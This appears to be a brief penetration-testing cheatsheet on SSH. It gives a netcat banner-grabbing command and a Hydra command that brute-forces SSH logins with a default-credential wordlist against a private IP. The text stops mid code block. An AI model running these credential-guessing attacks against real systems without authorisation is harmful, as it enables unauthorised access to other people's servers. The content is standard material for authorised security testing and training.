# SSH Exploitation and Enumeration Cheatsheet

## Banner Grabbing

```bash
nc -vn 192.168.1.1 22
```

## Brute Force SSH with Hydra

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.1.1
